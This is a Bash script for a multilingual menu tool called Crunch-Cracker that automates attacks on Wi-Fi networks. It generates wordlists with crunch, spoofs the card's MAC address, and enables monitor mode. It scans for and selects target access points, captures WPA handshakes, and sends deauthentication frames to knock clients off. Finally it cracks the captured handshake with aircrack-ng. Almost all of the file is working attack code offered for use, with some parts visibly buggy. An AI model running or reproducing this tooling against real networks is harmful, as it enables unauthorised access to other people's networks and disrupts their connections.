#!/bin/bash

# *************************
# * Crunch-Cracker V 1.0b *
# *************************
#						 
# Function crunch simple Wordlist generator
# 
# Date: 10/10/2016
# Dev: Shell
# BY: KURO
#
# *************************
# * Crunch-Cracker V 1.1  *
# *************************
#						 
# + Setting menu Multilangual
# + Graphic
# 
# Date: 23/04/2017
# Dev: Shell
# BY: KURO
#
# *************************
# * Crunch-Cracker V 1.2  *
# *************************
#						 
# + Fonction crack
# + Graphic
# 
# Date: 29/04/2017
# Dev: Shell
# BY: KURO
#

#### CONFIG ####################################################################

DUMP="Wordlist"
TMP2="KEY"
mon="mon"

TOPLEFTBIG="-geometry 100x85+0+0"
TOPLEFTBIG2="-geometry 100x20+0+0"

#**** Colors ****

W="\033[1;37m"
GR="\033[0;37m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
EC="\033[0m"


#**** txt ****

Titre=" Crunch-Cracker v1.1 "


#**** PATH ****

chmod +x aimon-ng

#mkdir $DUMP
if [ -d "$DUMP" ];
		then
			echo -e " ";
		else
			echo -e " ";
			mkdir $DUMP
	fi

#**** SET LANGUAGE ****

function setting {

if [ "$CC_AUTO" =  "1" ];then 
	english; setting

else 

     while true; do
	
	top

	echo -e "
   $GR╔═══════════════════════════╗
   ║ $R["$Y"i"$R"]"$W" Select your$W language$GR  ║
   ╚═╦══════════════════════╦══╝
     ║   ╔═══╦══════════╗   ║
     ║   ║$G 1$GR ║$W English  ║   ║
     ╚═══╣$G 2$GR ║$W French   ╠═══╝
	 ║$G 3$GR ║$W Spanish  ║
	 ╚═══╩══════════╝"

                
	echo 
	read -p " Choice: " choix
	echo ""
	case $choix in
		1 ) eng; main; break ;;
            	2 ) fr; main; break;;
		3 ) span; main; break;;
		* ) echo -e "$W [$R ERROR $W]" && sleep 3 ;setting;;
	  esac
    done
fi 

}

function eng {

	OPT="$W  O$GR""p$W""T$GR""io$W""N"
	NAME_WL=" Name"
	error=" ERROR"
	Choice=" Option"
	YES="Yes"
	NO="No "
	MAKE="$W""C$GR""re$W""AT$GR""e a$W W$GR""o$W""RDL$GR""is$W""T "
	ENTER="ENTER"
	Exit="$R""Exit   "
	Return="$W""RE$GR""tu$W""RN"
	SELECT_DEVICE="$W[$Y!$W]$G Select a device (exp: wlan0)"
	HTARGET="Target"

#~~~~ EXIT ~~~~
	CLOSE="$W C L O S I N G..."
	OFF=" Thank you for using$R C$W""runch$G-$R""C$W""racker"

#~~~~ INFO ~~~~
	INFBAR="╔═════════════════════════════════════════╗"
	INFBAR2="╚═════════════════════════════════════════╝"
	INFNAME="$G Name:$W.......Crunch-Cracker            "
	INFVER="$G Version:$W....1.2                       "
	INFLNG="$G Language:$W...[ENG, FR, ESP]            "
	INFDATE="$G Date:$W.......04/29/2017                "
	INFAUTH="$G Author:$W.....KURO                      "
	INFTYPE="$G Type:$W.......Simple Wordlist generator "
	INFDEV="$G Dev:$W........Shell                     "

#~~~~ SET LIST ~~~~
	TLIST="╔═════════════════════════════════════╗"
	TLIST2="╚═╦═══════════════════════════════════╝"
	SETLIST_INFMIN="$W[$Y!$W]$G Enter a minimum number of characters "
	SETLIST_INFMAX="$W[$Y!$W]$G Enter a maximum number of characters "
	SETLIST_INFCHAR="$W[$Y!$W]$G Enter the characters of your choice"
	SETLIST_IN="$w Char"
	SETLIST_NAMELIST="$W[$Y!$W]$G Enter a name for the wordlist"
	SETLIST_WAIT=" Please wait..."
	SETLIST_FINISH="$G Your list is complete$W "
	SETLIST_FOLDERLIST=" [$R!$W]$G Folder:$Y (/$DUMP/"
	SETLIST_SELECT="$G""Select a list$Y"
	SETLIST_SELECT2="$G""Use a list? $W"

#~~~~ COMPRESS ~~~~
	ZIPLIST="╔════════════════════════════════════╗"
	ZIPTLIST2="╚═╦══════════════════════════════════╝"
	COMPRESS_MSG=" Do you want to compress the list?"
	COMPRESS_INFO="(Back to main menu)"
	COMPRESS_WAITC=" Compression... Please wait... "
	COMPRESS_OK=" [$G""OK""$W]$Y Compression Finished! "
	COMPRESS_SUPP="$W [$G""OK""$W]$Y Del $Nom.txt"

#~~~~ CRACKER ~~~~
	TCRACK="╔═══╦════════╗"
	TCRACK2="╚═══╩════════╝"
	C_SCAN="WIFI attack "
	C_CRACK="Scan  "
	C_RETURN="Return "

#~~~~ HEADER SCAN ~~~~
header_scanchan="Network scan"

#~~~~ DIAL EXIT ~~~
CLEAN="["$G"i"$W"] Clean $GR""Dump$W"
MACCHANGR=""$W"["$G"i"$W"] Restoration $GR""Macchanger$W"
NMANAGER="["$G"i"$W"] Restart $GR""Network-manager$W"
CLOSEMON="$W[$G*$W] Kill  $GR""airmon-ng$W"

}


function fr {

#~~~~ MENU ~~~~    	
	OPT="$W  O$GR""p$W""T$GR""i$W""O$GR""n"
	NAME_WL=" Nom"
    	error="ERREUR"
    	Choice=" Option"
	YES="Oui"
	NO="Non"
	MAKE="$W""C$GR""ré$W""ER U$GR""ne $W""WO$GR""r$W""DL$GR""i$W""ST"
	ENTER="ENTREE"
    	Exit="$R""Fermer "
	Return="$W""RE$GR""to$W""U$GR""r"
	SELECT_DEVICE="$W[$Y!$W]$G Choisissez une carte (exp: wlan0)"
	HTARGET="Cible"

#~~~~ EXIT ~~~~
	CLOSE="$W F E R M E T U R E..."
	OFF="Merci d'avoir utilisé$R C$W""runch$G-$R""C$W""racker"

#~~~~ INFO ~~~~
	INFBAR="╔═══════════════════════════════════════════╗"
	INFBAR2="╚═══════════════════════════════════════════╝"
	INFNAME="$G Nom:$W......Crunch-Cracker		    "
	INFVER="$G Version:$W..1.2 			    "
	INFLNG="$G Langue:$W...[ENG, FR, ESP]		    "
	INFDATE="$G Date:$W.....29/04/2017		    "
	INFAUTH="$G Auteur:$W...KURO			    "
	INFTYPE="$G Type:$W.....Simple générateur de Wordlist "
	INFDEV="$G Dev:$W......Shell 			    "

#~~~~ SET LIST ~~~~
	TLIST="╔════════════════════════════════════╗"
	TLIST2="╚═╦══════════════════════════════════╝"
	SETLIST_INFMIN="$W[$Y!$W]$G Entrez un nombre de caractères minimun "
	SETLIST_INFMAX="$W[$Y!$W]$G Entrez un nombre de caractères maximum "
	SETLIST_INFCHAR="$W[$Y!$W]$G Entrez les caratères de votre choix"
	SETLIST_IN=" Caractères"
	SETLIST_NAMELIST="$W[$Y!$W]$G Donnez un nom à votre wordlist"
	SETLIST_WAIT=" Création de la liste, veuillez patienter un instant..."
	SETLIST_FINISH="$G Votre Wordlist est terminé$W "
	SETLIST_FOLDERLIST=" [$R!$W]$G Dossier d'enregistrement$Y (/$DUMP/"
	SETLIST_SELECT="$G""Selectionnez une liste$Y"
	SETLIST_SELECT2="$G""Utiliser une liste?$W"
	

#~~~~ COMPRESS ~~~~
	ZIPLIST="╔═══════════════════════════════════╗"
	ZIPTLIST2="╚═╦═════════════════════════════════╝"
	COMPRESS_MSG=" Voulez-vous compresser la liste?"
	COMPRESS_INFO="(Retour au menu principal)"
	COMPRESS_WAITC=" Compression... patientez un instant. "
	COMPRESS_OK=" [$G""OK""$W]$Y Compression terminée! "
	COMPRESS_SUPP="$W [$G""OK""$W]$Y Suppression de "

#~~~~ CRACKER ~~~~
	TCRACK="╔═══╦════════╗"
	TCRACK2="╚═══╩════════╝"
	C_SCAN="Attaque WIFI"
	C_CRACK="scanne"
	C_RETURN="Retour "

#~~~~ HEADER SCAN ~~~~
header_scanchan="Scan réseau"

#~~~~ DIAL EXIT ~~~
CLEAN="["$G"i"$W"] Nettoyage $GR Dump$W"
MACCHANGR=""$W"["$G"i"$W"] Kill $GR Macchanger$W"
NMANAGER="["$G"i"$W"] Redemarrage du service $GR Network-manager$W"
CLOSEMON="$W[$G*$W] Désactivation du$GR monitoring"

}

function span {

#~~~~ MENU ~~~~
	OPT="$W O$GR""pc$W""I$GR""o$W""n "
	NAME_WL=" Nombre"
    	error="ERROR"
    	Choice=" Opcion"
	YES="Si "
	NO="No "
	MAKE="$W""C$GR""re$W""A$GR""r $W""U$GR""n$W""A LI$GR""st$W""A   "
	ENTER="ENTRAR"
    	Exit="$R""Cerrar "
	Return="Volver "
	SELECT_DEVICE="$W[$Y!$W]$G Seleccione un dispositivo (exp: wlan0)$W"
	HTARGET="Objectivo"

#~~~~ EXIT ~~~~
	CLOSE="$W C I E R R E..."
	OFF="Gracias por usar$Y C$W""runch$G""-$Y""C$W""racker"

#~~~~ INFO ~~~~
	INFBAR="╔═══════════════════════════════════╗"
	INFBAR2="╚═══════════════════════════════════╝"
	INFNAME="$G Nombre:$W...Crunch-Cracker        "
	INFVER="$G Version:$W..1.2 	            "
	INFLNG="$G Lengua:$W...[ENG, FR, ESP]        "
	INFDATE="$G Fecha:$W....29/04/2017            "
	INFAUTH="$G Autor:$W....KURO                  "
	INFTYPE="$G Tipo:$W.....Generador de Wordlist "
	INFDEV="$G Dev:$W......Shell 	            "


#~~~~ SET LIST ~~~~
	TLIST="╔═══════════════════════════════════╗"
	TLIST2="╚═╦═════════════════════════════════╝"
	SETLIST_INFMIN="$W[$Y!$W]$G Entroduzca un mumero minimo de caracteres "
	SETLIST_INFMAX="$W[$Y!$W]$G Entroduzca un mumero maximo de caracteres "
	SETLIST_INFCHAR="$W[$Y!$W]$G Entroducir los caracteres de su eleccion"
	SETLIST_IN=" Caracteres"
	SETLIST_NAMELIST="$W[$Y!$W]$G Dar un nombre a tu wordlist"
	SETLIST_WAIT=" Crear lista, espere un momento..."
	SETLIST_FINISH="$G Su lista esta terminada$W "
	SETLIST_FOLDERLIST=" [$R!$W]$G Carpeta$Y (/$DUMP/"
	SETLIST_SELECT="$G""Lista de seleccion$Y"
	SETLIST_SELECT2="$G""Utilizar una lista$W"

#~~~~ COMPRESS ~~~~
	ZIPLIST="╔════════════════════════════════╗"
	ZIPTLIST2="╚═╦══════════════════════════════╝"
	COMPRESS_MSG=" Que desea comprimir la lista?"
	COMPRESS_INFO="(Volver at menu principal)"
	COMPRESS_WAITC=" Compresion, espere un momento... "
	COMPRESS_OK=" [$G""OK""$W]$Y Compresion termino! "
	COMPRESS_SUPP="$W [$G""OK""$W]$Y Supresion $Nom.txt."

#~~~~ CRACKER ~~~~
	TCRACK="╔═══╦═════════╗"
	TCRACK2="╚═══╩═════════╝"
	C_SCAN="Ataque WIFI "
	C_CRACK="Escaner"
	C_RETURN="Regreso "
	

#~~~~ HEADER SCAN ~~~~
header_scanchan="Busca el red"

#~~~~ DIAL EXIT ~~~
CLEAN="["$G"i"$W"] Limpieza$GR Dump"$W""
MACCHANGR=""$W"["$G"i"$W"] Restauracion$GR Macchanger$W"
NMANAGER="["$G"i"$W"] Reinicio del$GR Network-manager$W"
CLOSEMON="$W[$G*$W] Désactivation du$GR monitoring$W"



}


#**** SET LANGUAGE END ****

##### CONFIG FIN ###################################################################


#### INTRO ########################################################################

function RUN {

	clear
	sleep 0.5
	echo -e "$G		8eeee8 "
	sleep 0.5                              
	echo -e "		8    i eeeee  e   e eeeee eeee e   e" 
	sleep 0.4
	echo -e "		8e     8   8  8   8 8   8 8  8 8   8 "
	sleep 0.3
	echo -e "		88     8eee8e 8e  8 8e  8 8e   8eee8 "
	sleep 0.2 
	echo -e "		88   e 88   8 88  8 88  8 88   88  8 "
	sleep 0.1
	echo -e "		88eee8 88   8 88ee8 88  8 88e8 88  8 "
	sleep 1
	
	echo -e "$R	     8eeee8"                                      
	echo -e "	     8    i eeeee  eeeee eeee e   e  eeee eeeee"  
	echo -e "	     8e     8   8  8   8 8  8 8   8  8    8   8 " 
	echo -e "	     88     8eee8e 8eee8 8e   8eee8e 8eee 8eee8e "
	echo -e "	     88   e 88   8 88  8 88   88   8 88   88   8 "
	echo -e "	     88eee8 88   8 88  8 88e8 88   8 88ee 88   8$GR"" v 1.2"
	sleep 0.5
	echo
	echo -e "$G	  [$Y""W$G]$W""or$G[$Y""D$G]$W""li$G[$Y""$""$G]$W""t$G [$Y""G$G]$W""en$G[$Y""E$G]$W""ra$G[$Y""T$G]$W""or$R/$W[$Y""W$W]$G""i$W[$Y""F$W]$G""i c$W[$Y""R$W]$G""ac$W[$Y""K$W]$G""er "
	sleep 0.5
	echo -e "			         $W[$G""B$W]$G""y "
	sleep 0.5
	echo -e "			      $W[$Y""K$W][$G""U$W]$G""R$W[$R""O$W] "
	sleep 3
	setting

}

#### INTRO FIN #############################################################################


#~~~~ Menu 1 ~~~~

function main {

	clear

	echo

	top

	echo -e "
  $W╔═════════════╗
  ║ $OPT $W   ║
  ╚═╦═══════════╝
    ║   ╔═══╦═════════════════╗
    ║   ║$Y 1 $W║ I$GR""n$W""FO$W            ║
    ╚═══╣$G 2 $W║ CR$GR""un$W""CH-C$GR""ra$W""CK$GR""e$W""R $W ║
	║$R 0 $W║$R $Exit   $W      ║
	╚═══╩═════════════════╝ "
	echo
	read -p " $Choice: " choix
		case $choix in
			1) information;;
			2) Crunchmenu;;
			0) EXITMENU;;
			*) echo -e "$W [$R $error$W ]" && sleep 3
		esac
	

}

#~~~~ INFO ~~~~

function information {

	clear

	echo

	top

	echo
	echo -e " $INFBAR"	
	echo -e " ║ $INFNAME ║"
	sleep 0.2
	echo -e " ║ $INFVER ║"
	sleep 0.2
	echo -e " ║ $INFLNG ║"
	sleep 0.2
	echo -e " ║ $INFDATE ║"
	sleep 0.2
	echo -e " ║ $INFAUTH ║"
	sleep 0.2
	echo -e " ║ $INFTYPE ║"
	sleep 0.2
	echo -e " ║ $INFDEV ║"
	echo -e " $INFBAR2"
	echo
	sleep 0.5 
	echo -e "$W $Return$R [$ENTER]"
	read pause		 
main
}

#### INFO FIN ######################################################################

#### MENU CRUNCH ###################################################################

function Crunchmenu {

	clear

	echo

	top

	echo -e "
  $W╔════════════════════╗
  ║     $OPT $GR      ║
  ╚═╦══════════════════╝
    ║   ╔═══╦════════════════════╗
    ║   ║$Y 1 $W║ $MAKE$W ║
    ║   ║$G 2 $W║ $C_SCAN$W       ║
    ╚═══╣$W 3 ║ $Return $W        	 ║
	║$R 0 $W║$R $Exit   $W         ║
	╚═══╩════════════════════╝ "
	echo
	read -p " $Choice: " choix
		case $choix in
			1) LST;;
			2) CRACKER;;
			3) main;;
			0) EXITMENU;;
			*) echo -e "$W [$R $error$W ]" && sleep 3
		esac
Crunchmenu
}


#**** Set list ****
function LST {

	clear

	top

	echo
	echo -e "$SETLIST_INFMIN $W "
	echo
	read -p " Min: " nummin
	clear
	echo
	top
	echo
	echo -e "$SETLIST_INFMAX $W "
	echo
	read -p " Max: " nummax
	clear 
	echo
	top
	echo
	echo -e "$SETLIST_INFCHAR $W"
	echo
	read -p " $SETLIST_IN: " char
	clear
	echo
	top
	echo
	echo -e "$SETLIST_NAMELIST $W"
	echo
	read -p " $NAME_WL: " Nom
		sleep 1
		clear
		echo
		top
		echo
		echo -e "$SETLIST_WAIT"
		echo
		sleep 1
		crunch $nummin $nummax $char -o $DUMP/$Nom.txt
		echo 
		top
		echo
		echo -e "$SETLIST_FINISH "
		echo -e " $SETLIST_FOLDERLIST$Nom.txt)$W [$R!$W]"
		echo
		echo -e "$W $Return $R[$ENTER]$W"
		read pause
compress
}

#### COMPRESSION ####################################################################

function compress {
		clear
		echo
		top
		echo
		echo -e "
  $ZIPLIST
  ║$W $COMPRESS_MSG $W║
  $ZIPTLIST2
    ║   ╔═══╦════════╗
    ║   ║$Y 1 $W║ $YES    $W║
    ║   ║$G 2 $W║ $NO    $W║
    ╚═══╣$R 0 $W║ $Exit$W║
	╚═══╩════════╝ "
		read -p " $Choice: " choix
		case $choix in
			1) echo
			   echo -e "$COMPRESS_WAITC "
			   cd $DUMP &&
			   tar cvzf $Nom.tar $Nom.txt
				rm -f $Nom.txt
			   clear
			   echo
			   top
			   echo
			   echo -e " $COMPRESS_OK"
			   sleep 1
			   echo -e " $COMPRESS_SUPP$Nom.txt"
			   sleep 3 ;;

			2) main;;
			0) EXITMENU;;
			*) echo -e "$W [$R $error$W ]" && sleep 3 compress;;
		esac

main

}

#####################################################################################

##### Fonction CRACKER ##############################################################

function CRACKER {

	clear
	echo
	top
	echo
	echo -e "
  $W╔════════════════════╗
  ║     $OPT $W      ║
  ╚═╦══════════════════╝
    ║   $TCRACK
    ║   ║$G 1 $W║ $C_CRACK $W║
    ╚═══╣$R 0 $W║$R $C_RETURN$W║
	$TCRACK2$W"
	echo
	read -p " $Choice: " choix
		case $choix in
			1) MONITOR;;
			0) main;;
			*) echo -e "$W [$R $error$W ]" && sleep 3
		esac
Crunchmenu	

}


##### Fonction CRACKER FIN ##########################################################


##### Fonction SCAN #################################################################

function MONITOR {

	clear

	mkdir CRACKTMP
	TMP="CRACKTMP"

	top
	echo 
	echo -e "$SELECT_DEVICE$Y"
	echo
	ifconfig | grep -a 'wlan' | awk '{print $1}'
	echo -e "$W"
	read -p "Carte: " device
	clear
	top
	echo
	ifconfig $device down
	sleep 1
	macchanger -r $device
	sleep 1 
	ifconfig $device up
	sleep 1
	clear
	top
	echo
	airmon-ng check kill
	airmon-ng start $device
	sleep 2
SCANNER
}

function SCANNER {

	CSV=dump-01.csv

	rm -rf $TMP/*

	xterm -hold -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#11ff00" -e airodump-ng -w $TMP/DUMP -a $device$mon --ignore-negative-one &
	sleep 10
	killall xterm
OUTSCAN

}
##### Fonction SCAN FIN #############################################################

function OUTSCAN {

	clear
	top
	CSV="DUMP-01.csv"
	WIFI=`wc -l $TMP/$CSV | awk '{print $1}'`
	echo 

	head -n $CIBLE $TMP/$CSV &> $TMP/dump-02.csv
	tail -n +$CIBLE $TMP/$CSV &> $TMP/target.csv
	echo "                        WIFI LIST "
	echo ""
	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i +1))
			POWER=`expr $POWER + 100`
			TARGET=`cat $TMP/target.csv | grep $MAC`

			if [ "$TARGET" != "" ]; then
				TARGET="*"
			echo -e " "$R"["$Y"$i"$R"]"$G"$TARGET\t""$R"$MAC"\t""$R "$CHANNEL"\t""$G" $PRIVACY"\t  ""$R"$POWER%"\t""$R "$ESSID""$EC""

			else

			echo -e " "$R"["$Y"$i"$R"]"$W"$TARGET\t""$Y"$MAC"\t""$G "$CHANNEL"\t""$GR" $PRIVACY"\t  ""$Y"$POWER%"\t""$G "$ESSID""$EC""

			fi

			aidlength=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $TMP/$CSV
 
	if [ "$CC_AUTO" = "1" ];then 
		choice=1
	else
		echo
		echo -e ""$W "("$R"*"$W") $selec_1"$transparent""
		echo -e "        $selec_2"
		echo -e "$W [$R""r$W]$Y Re-scan"
		echo -n -e " $G$HTARGET:$W "
		read choice
	fi 

	if [[ $choice -eq "r" ]]; then
		SCANNER
	fi

	idlength=${aidlength[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
	Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`

	HANDSHAK & 
	sleep 4

VALID

}

##### Fonction HANDSHAK #########################################################

function HANDSHAK { 

	xterm -hold $TOPLEFTBIG2 -e "airodump-ng -w $TMP/$OUTPUT -c$Host_CHAN --essid $Host_SSID --bssid $Host_MAC $device$mon" & 

}

##### Fonction HANDSHAK Fin #####################################################


######## FONCTION VALID ##########################################################

function VALID {

	clear
	top
	echo -e "
	Handshake 
		  $W[$G""1$W] $YES
		  [$Y""2$W] $NO  "
	echo
	read -p " $Choice: " choix
		case $choix in
			1) KILLPROC;;
			2) DEAUTH;;
			*) echo -e "$W [$R $error$W ]" && sleep 3
		esac
}

######## FONCTION DEAUTH ########################################################

function DEAUTH {
	
	DD="aireplay-ng --deauth 10 -a " 
	$DD $Host_MAC $device$mon 
	
VALID
}


######## FONCTION DEAUTH FIN #####################################################

#~~~~ KILL ~~~~

function KILLPROC {

	killall xterm &

SETCRACK

}


#~~~~ SETCRACK ~~~~

function SETCRACK() {

	clear
	top
	echo -e "
	$SETLIST_SELECT2
  
		  $W[$G""1$W] $YES
		  [$Y""2]$W $NO  
		  [$R""0]$R $Exit $W"
	echo
	read -p " Choix: " choix
		case $choix in
			1) RLIST;;
			2) CRK;;
			0) EXITMENU;;
			*) echo -e "$W [$R $error$W ]" && sleep 3
		esac
}	

######## FONCTION VALID FIN ################################################

#~~~~ FOLDER LIST ~~~~
function RLIST {

	clear
	top
	echo
	echo -e " $SETLIST_SELECT"
	echo 
	ls Wordlist/
	echo " "
	read -p " List: " WORDLIST
CRACKLIST

}

##### Fonction CRK #########################################################

function CRK() {

	if [ -d "$TMP2" ];
		then
			echo -e " ";
		else
			echo -e " ";
			mkdir $TMP2
	fi
	xterm -hold -e "aircrack-ng $TMP/$OUTPUT-01.cap -l $TMP2/KEY_$Host_SSID.txt" &

NETWORKRESTOR
}

#~~~~ WORDLIST ~~~~
function CRACKLIST() {
	
	clear
	echo
	top
	echo

	if [ -d "$TMP2" ];
		then
			echo -e " ";
		else
			echo -e " ";
			mkdir $TMP2
	fi


	xterm -hold -e "aircrack-ng $TMP/$OUTPUT-01.cap -w $DUMP/$WORDLIST -l $TMP2/KEY_$Host_SSID.txt" &
	
NETWORKRESTOR
}
##### Fonction CRK Fin #####################################################

#~~~~ NETWORKRESTOR ~~~~
function NETWORKRESTOR {

	clear
	echo
	top
	echo
	rm -Rf $TMP
	echo -e "$CLOSEMON"
	airmon-ng stop $device$mon
	sleep 3
	clear
	echo
	top
	echo
	echo -e "$MACCHANGR"
	ifconfig $device down
	sleep 2
	sudo macchanger -p $device
	sleep 2
	ifconfig $device up
	sleep 2
	clear
	top
	echo
	echo -e "$NMANAGER"
	sleep 0.5
	service network-manager restart
	sleep 5
main

}

##### Fonction Top ##################################################################

function top() {

	clear
	echo
	sleep 0.1 
	echo -e " $W╔═════════════════════════════════════════════╗" 
	echo -e " ║$R  	C$W R U N C H $R C$W R A C K E R$GR  v$G 1.2$W      ║" 
	echo -e " $W╚═════════════════════════════════════════════╝"
	sleep 0.5
	

}


##### EXIT ###################################################################################

function EXITMENU {

	clear
	echo
	top
	echo
	echo -e "$W $CLOSE"
	echo
	sleep 0.5
	echo -e "$CLEAN"
	sleep 0.5	
	echo -e "$MACCHANGR"
	sleep 0.5
	service network-manager restart
	echo -e "$NMANAGER"
	sleep 5
	echo
	echo -e " [$R*$W] $G $OFF $W [$R*$W]"
	sleep 3
	clear
	exit
}

######################################## END ######################################

####################################### START #####################################

RUN

